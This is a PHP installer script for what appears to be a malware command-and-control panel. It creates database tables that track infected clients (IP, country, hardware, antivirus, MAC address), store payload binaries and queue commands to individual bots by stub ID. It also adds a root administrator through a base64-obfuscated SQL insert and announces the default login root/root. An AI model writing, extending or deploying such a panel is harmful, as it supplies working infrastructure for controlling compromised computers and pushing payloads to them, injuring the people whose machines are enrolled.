<?php

session_start();
session_unset();
session_destroy();

include('./database/db-config.php');
include('./database/db-conn.php');

function CreateUsers($connection)
{
    $SqlCreateUsers = "CREATE TABLE `Users` (
        `Id` INT NOT NULL AUTO_INCREMENT,
        `Username` VARCHAR(60) NOT NULL,
        `Password` VARCHAR(60) NOT NULL,
        PRIMARY KEY (`Id`)
    );";
    
    try
    {
        $connection->exec($SqlCreateUsers);
    }
    catch(Exception $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the users table.</div>");

        return false;
    }    

    return true;
}

function CreateClients($connection)
{
    $SqlCreateClients = "CREATE TABLE `Clients` (
        `Id` INT NOT NULL AUTO_INCREMENT,
        `Ip` VARCHAR(24) NOT NULL,
        `Country` VARCHAR(12) NOT NULL,
        `Ram` VARCHAR(12) NOT NULL,
        `LastSeen` TIMESTAMP NOT NULL ON UPDATE CURRENT_TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        `CPU` VARCHAR(255) NOT NULL,
        `AntiVirus` VARCHAR(255) NOT NULL,
        `MacAddr` VARCHAR(255) NOT NULL,
        PRIMARY KEY (`Id`)
    );";
    
    try
    {
        $connection->exec($SqlCreateClients);
    }
    catch(Exception $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the clients table.</div>");

        return false;
    }

    return true;
}

function CreatePayloads($connection)
{
    $SqlCreatePayload = "CREATE TABLE `Payloads` (
        `Id` INT NOT NULL AUTO_INCREMENT,
        `FileName` VARCHAR(16) NOT NULL,
        `Name` VARCHAR(16) NOT NULL,
        `Extension` varchar(6) NOT NULL,
        `PayloadBytes` BLOB,
        PRIMARY KEY (`Id`)
    );";
    
    try
    {
        $connection->exec($SqlCreatePayload);
    }
    catch(Exception $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the payloads table.</div>");

        return false;
    }

    return true;
}

function CreateCommands($connection)
{
    $SqlCreateCommands = "CREATE TABLE `Command` (
        `Id` INT NOT NULL,
        `StubId` INT,
        `Client_Id` INT NOT NULL,
        `Command` VARCHAR(16) NOT NULL,
        PRIMARY KEY (`Id`)
    );";
    
    try
    {
        $connection->exec($SqlCreateCommands);
    }
    catch(PDOException $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to create the commands table</div>");

        return false;
    }

    return true;
}

function InsertUser($connection)
{
    $SqlInsertUser = base64_decode("SU5TRVJUIElOVE8gYHVzZXJzYCAoYElkYCwgYFVzZXJuYW1lYCwgYFBhc3N3b3JkYCkgVkFMVUVTIChOVUxMLCAncm9vdCcsICckMnkkMTAkbE1hTzdsdTZFNlpLTkJIM3N3cVFLLmxVWno3VUJOVW44T3RnZW43L3NKNVRFTW9RRWtJTXUnKTs=");
    try
    {
        $connection->exec($SqlInsertUser);        
    }
    catch(PDOException $ex)
    {
        echo("<div class=\"notification is-danger\">Unable to insert the root user</div>");

        return false;
    }

    return true;
}

?>




<!DOCTYPE html>
<html lang="en">
<head>
    <?php include './includes/head.php';?>
</head>
<body>
    <header>
        <?php include 'includes/header.php';?>
    </header>
    <main>
        <div class="container">
            <form action="set-command.php" method="post">
                <section class="section">
                    
                    <div class="columns is-centered">
                        <div class="column is-6">
                            <div class="notification is-primary">
                                <p>Attempting to create new tables and insert the root user</p>
                            </div>
                            <?php                                                                 
                                try
                                {
                                    $stmt = $dbconn->prepare("SELECT * FROM Users");
                                    $stmt->execute();

                                    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
                                }
                                catch(PDOException $ex)
                                {
                                    if(CreateClients($dbconn) && CreatePayloads($dbconn) && CreateUsers($dbconn) && InsertUser($dbconn) && CreateCommands($dbconn))
                                    {
                                        echo("<div class=\"notification is-primary\">Succesfully created the Users, Clients and Payload table. <br> 
                                        You may now login using <br> 
                                        Username: root <br> 
                                        Password: root 
                                        </div>");
                                    }
                                }
                            ?>
                            <div class="notification is-warning">
                                <p>Rememer to remove the setup.php from your webserver after running this script.</p>
                            </div>
                        </div>
                    </div>
                </section>
            </form>
        </div>
    </main>
    <script type="text/javascript" src="./js/menu.js"></script>
</body>

</html>